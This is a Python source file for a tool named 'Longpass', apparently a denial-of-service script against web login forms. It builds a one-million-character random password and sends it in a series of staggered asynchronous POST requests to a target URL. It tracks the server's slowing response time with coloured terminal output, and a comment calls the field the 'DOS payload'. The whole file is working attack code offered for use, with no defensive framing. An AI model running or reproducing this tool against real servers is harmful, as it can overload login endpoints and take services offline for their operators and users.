import sys
import asyncio
import aiohttp
import time
from random import choice
from string import ascii_letters
from termcolor import colored

class Longpass:

    url = ""
    delay = 1
    username = ""
    size = 1000000
    repeats = 20
    password = ""

    iterations = 0
    tasks = list()
    payload = dict()
    response_time = 0

    ui = list()

    def run(self):

        # Generate the password
        self.updateUI(2, "Generating the password...")
        password = self.generatePassword(self.size)
        self.updateUI(2, "Done!\n")

        # Set the POST payload
        # @todo Add an ability to set a custom variable name for the "password" DOS payload variable
        #self.payload = { 'username': self.username, 'password': password }
        self.payload['password'] = password
        #self.updateUI(0, password) # debug
        password = None

        # Add requests to the task list
        for i in range(self.repeats):
            delay = i * self.delay
            self.updateUI((i+4), colored("Request " + str(i+1) + ": Scheduled...", 'grey'))
            self.tasks.append(self.makeRequest(delay, i))

        # Event loop that waits for tasks to complete
        loop = asyncio.get_event_loop()

        # Run the loop until every task is complete
        loop.run_until_complete(asyncio.wait(self.tasks))
        #loop.run_until_complete(self.shootTasks())


        # Close the loop
        loop.close()


    def bold(self, msg):
        return u'\033[1m%s\033[0m' % msg

    def generatePassword(self, size):
        # Generate password
        return "".join(choice(ascii_letters) for i in range(size))

    def clear(self):
        # Clear screen, return cursor to top left
        sys.stdout.write('\033[2J')
        sys.stdout.write('\033[H')
        sys.stdout.flush()

    def updateUI(self, position, txt):
        # Set the UI dict line, EAFP style
        try:
            self.ui[position] = txt
        except IndexError:
            self.ui.insert(position, txt)

        self.clear()
        for msg in self.ui:
            sys.stdout.write(msg + "\n")

    def progress(self,step):

        # Add step to progress
        self.iterations += step

        color = 'white'

        # Set warning colors for server response time
        if self.response_time <= 5:
            color = 'white'
        if self.response_time >= 6:
            color = 'yellow'
        if self.response_time >= 20:
            color = 'red'

        percentage = colored("\n" + str(round((self.iterations / (self.repeats * 2)) * 100, 1)) + "% done", 'white', attrs=['bold']) + " - "
        response = "Server response time: "+ colored(str(round(self.response_time, 4)), color, attrs=['bold']) +" sec"
        progress = percentage + response
        self.updateUI(self.repeats + 3, progress)

    async def makeRequest(self, delay, i):
        """
        Make an asynchronous POST request
        """

        # Wait until it's time
        await asyncio.sleep(delay)

        # UI line position
        position = 3 + i

        # Request id for UI
        id = "Request " + str(i+1)

        self.updateUI(position, colored(id + ": Sending request...", 'yellow'))

        # Add to iteration counter
        self.progress(1)

        #self.printStatus(0)

        # Measure time
        start = time.time()

        # The actual request
        response = await aiohttp.post(self.url, data = self.payload)

        # Response debug
        #self.updateUI(50, await response.text())

        # Add to iteration counter
        self.progress(1)

        # Request response time
        duration = time.time() - start

        self.response_time = duration

        # Display the progress
        self.updateUI(position, colored(id + ": Done, server response time " + str(round(duration, 2)) + " seconds.", 'green', attrs=['bold']))

        # Close the connection
        response.close()
